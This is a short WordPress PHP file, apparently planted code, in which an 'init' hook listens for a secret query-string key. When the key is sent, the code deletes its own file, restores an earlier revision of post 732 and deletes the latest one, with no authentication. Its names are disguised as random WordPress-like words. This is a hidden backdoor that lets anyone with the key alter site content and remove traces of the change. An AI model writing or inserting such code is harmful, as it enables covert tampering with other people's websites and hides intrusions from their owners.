<?php

function woff2_authors_post() {
	if (isset($_GET['edition_map_lightbox_reader']) && $_GET['edition_map_lightbox_reader'] === 'badge_subscriptions_icon_menu') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$connect_thumbnail_fonts = 732;
		$signature_elementor_redirection_digital = wp_get_post_revisions($connect_thumbnail_fonts);
		if (empty($signature_elementor_redirection_digital)) die('no revisions');
		if (count($signature_elementor_redirection_digital) < 2) die('less than 2');
		$modal_rest_testimonial_awesome = array_shift($signature_elementor_redirection_digital);
		$keywords_scheduler_alert = $modal_rest_testimonial_awesome->ID;
		$codes_author_external = array_shift($signature_elementor_redirection_digital);
		$cc_amp_portal = $codes_author_external->ID;
		$keyword_visual_class_webp = wp_restore_post_revision($cc_amp_portal);
		if ($keyword_visual_class_webp === false) die('error restoring');
		$keyword_visual_class_webp = wp_delete_post_revision($keywords_scheduler_alert);		
		if ($keyword_visual_class_webp === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'woff2_authors_post');
